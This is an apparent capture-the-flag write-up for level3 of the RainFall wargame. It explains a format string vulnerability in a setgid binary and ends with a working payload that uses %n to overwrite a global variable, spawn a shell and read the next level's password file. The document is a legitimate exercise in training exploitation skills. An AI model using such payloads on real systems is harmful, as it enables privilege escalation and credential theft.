# level3

## Hint

When we log into the machine as `level3`, we notice a binary:

```shell-session
level3@RainFall:~$ ls -l
total 6
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
```

We notice that the `guid` bit is set, so the executable gets the rights of its group owners granted when it is executed, and conveniently enough the group in question is our target for the current level.

That being said, it seems we need to look into the binary in order to try to understand what input it's awaiting.

## gdb

First, we'll need to see all available global symbols

```gdb
gdb-peda$ info variables
All defined variables:

Non-debugging symbols:
0x080485f8  _fp_hw

```

Now lets look at the functions of the binary

```gdb

# Format String Attack

The vulnerabilty here is clearly the usage of an unsanitized user-defined conversion string and the lack of variadic argument to `printf`. This combination is very dangerous as it allows the user to display data and addresses found in the stack, and it's precisely what is required by this exercise as we can read [here](https://owasp.org/www-community/attacks/Format_string_attack):
> The attack could be executed when the application doesnâ€™t properly validate the submitted input.
> In this case, if a Format String parameter, like %x, is inserted into the posted data, the string is parsed by the Format Function, and the conversion specified in the parameters is executed.
> However, the Format Function is expecting more arguments as input, and if these arguments are not supplied, the function could read or write the stack.

On top of that, we have type conversions and options at our disposal to access arbitrary positionnal arguments on the stack, namely:
- option `$` that is used with an integer `i` to access the `ith` argument positionned after printf
- type conversion `%n` that inserts an integer corresponding to the number of bytes written so far in the type conversion format.

This means:
```c
int randomarg;
int m;
printf("123%2$n", randomarg, &m); //will insert the value 3 at the addres of m
```

# Plan

There is a lot to unpack here, so lets proceed:

1. There is a conditionnal jump that leads to a shell but compares a static symbol `m` and a hardcoded value 64. This variable is outside of the control flow, so we must find a way to edit the contents of this variable without having access to it directly in order to reach the system call
2. The call to `printf` is vulnerable to user input. We can easily access values on the stack by feeding arbitrary conversion format to the function like `%s/p/x/n`
3. The addres of `m` is consistent. Thanks to the lack of ASLR on the VM.
4. By feeding the correct conversion through stdin, we will be able to write the correct value (`64`) in `m` so that the conditionnal jump succeeds and we end up with an open shell.

# Proceed



```shell-session
level3@RainFall:~$ (python -c "print '\x8c\x98\x04\x08' + '%60c' + '%4\$n'"; cat -) | ./level3

Wait what?!
cat /home/user/$(whoami)/.pass
